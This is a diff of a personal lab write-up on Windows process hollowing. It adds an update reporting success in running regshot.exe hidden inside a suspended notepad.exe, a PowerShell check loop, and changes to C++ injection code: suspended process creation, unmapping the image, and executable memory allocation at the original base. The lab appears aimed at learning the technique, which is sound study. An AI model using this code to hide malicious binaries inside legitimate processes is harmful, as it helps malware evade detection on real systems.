@@ -2,7 +2,7 @@
 
 This lab is my attempt to better understand a well known code injection technique called process hollowing, where a victim process is carved out from memory and gets replaced with a new malicious binary.
 
-Although I was not able to fully achieve process hollowing, I feel I got pretty close and still found value in doing this lab since the aim was to:
+Although I was not able to fully achieve process hollowing \(does not work with all binaries\), I feel I got pretty close and still found great value in doing this lab since the aim was to:
 
 * get a better understanding of the technique's technicalities under the hood
 * become a bit more comfortable with c++ and Windows APIs
@@ -10,7 +10,7 @@ Although I was not able to fully achieve process hollowing, I feel I got pretty 
 * become a bit more comfortable with inspecting / manipulating program's memory
 * get to do more PE parsing
 
-The lab was heavily based on this great resource [https://github.com/m0n0ph1/Process-Hollowing](https://github.com/m0n0ph1/Process-Hollowing).
+The lab was heavily based on the great resource [https://github.com/m0n0ph1/Process-Hollowing](https://github.com/m0n0ph1/Process-Hollowing).
 
 If you need more info on parsing PE files, see my previous lab:
 
@@ -43,11 +43,11 @@ We can get the offset location like so:
 
 ![](../../.gitbook/assets/screenshot-from-2019-04-28-16-33-33.png)
 
-We can then get the ImageBaseAddress by reading that memory location:
+We can then get the `ImageBaseAddress` by reading that memory location:
 
 ![](../../.gitbook/assets/screenshot-from-2019-04-28-16-39-47.png)
 
-Let's confirm we got the right address:
+Let's confirm we got the right `ImageBaseAddress`:
 
 ```text
 dt _peb @$peb
@@ -57,7 +57,7 @@ dt _peb @$peb
 
 ### Source Image
 
-Let's now switch gears to the source file - the binary that we want to execute inside the host file. In my case, it's a cmd.exe. I've opened the file, allocated required memory space and read the file to that location:
+Let's now switch gears to the source file - the binary that we want to execute inside the host/destination process. In my case, it's a cmd.exe. I've opened the file, allocated required memory space and read the file to that location:
 
 ![](../../.gitbook/assets/peek-2019-04-28-16-44.gif)
 
@@ -171,12 +171,29 @@ I am sure I messed something up along the way. Having said that, I tried compili
 
 If you are reading this and you see what I have missed, as always, I want to hear from you.
 
+## Update
+
+After talking to [@mumbai](https://twitter.com/ilove2pwn_), the issue I was having with memory allocation in the destination process at the `ImageBaseAddress` is now magically gone. This means that I can now perform process hollowing. I will be using notepad.exe \(line 28\) as the destination process and regshot.exe \(line 42\) will written to the hollowed notepad.exe:
+
+![](../../.gitbook/assets/screenshot-from-2019-04-29-21-15-38.png)
+
+Below is a online that constantly checks if there's a notepad.exe process running \(our destination process\). Once found, we check if a process `*regshot*` \(our source binary\) is running - to prove that it is not, since it should be hidden inside the notepad.exe, and break the loop:
+
+```csharp
+while(1) { get-process | ? {$_.name -match 'notepad'} | % { $_; get-process "*regshot*"; break } }
+```
+
+Below shows this all in action - once the program is compiled and executed, notepad.exe is launched, powershell loop \(top right\) stops. Note how regshot.exe is not visible in the process list, however when closing regshot.exe process the notepad.exe closes - the hollow is successful:
+
+![](../../.gitbook/assets/peek-2019-04-29-21-27.gif)
+
 ## Code
 
 {% code-tabs %}
 {% code-tabs-item title="process-hollowing.cpp" %}
 ```cpp
-// based on and adapted from https://github.com/m0n0ph1/Process-Hollowing
+// process-hollowing.cpp : This file contains the 'main' function. Program execution begins and ends there.
+//
 
 #include "pch.h"
 #include <iostream>
@@ -202,7 +219,7 @@ int main()
 	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
 	PROCESS_BASIC_INFORMATION *pbi = new PROCESS_BASIC_INFORMATION();
 	DWORD returnLenght = 0;
-	CreateProcessA(NULL, (LPSTR)"calc.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);
+	CreateProcessA(NULL, (LPSTR)"c:\\windows\\syswow64\\notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);
 	HANDLE destProcess = pi->hProcess;
 
 	// get destination imageBase offset address from the PEB
@@ -215,11 +232,11 @@ int main()
 	ReadProcessMemory(destProcess, (LPCVOID)pebImageBaseOffset, &destImageBase, 4, &bytesRead);
 
 	// read source file - this is the file that will be executed inside the hollowed process
-	HANDLE sourceFile = CreateFileA("c:\\windows\\syswow64\\cmd.exe", GENERIC_READ,	NULL, NULL, OPEN_ALWAYS, NULL, NULL);
+	HANDLE sourceFile = CreateFileA("C:\\temp\\regshot.exe", GENERIC_READ,	NULL, NULL, OPEN_ALWAYS, NULL, NULL);
 	DWORD sourceFileSize = GetFileSize(sourceFile, NULL);
 	LPDWORD fileBytesRead = 0;
 	LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize);
-	ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, fileBytesRead, NULL);
+	ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, NULL, NULL);
 	
 	// get source image size
 	PIMAGE_DOS_HEADER sourceImageDosHeaders = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
@@ -231,7 +248,7 @@ int main()
 	myNtUnmapViewOfSection(destProcess, destImageBase);
 
 	// allocate new memory in destination image for the source image
-	LPVOID newDestImageBase = VirtualAllocEx(destProcess, NULL, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	LPVOID newDestImageBase = VirtualAllocEx(destProcess, destImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	destImageBase = newDestImageBase;
 
 	// get delta between sourceImageBaseAddress and destinationImageBaseAddress
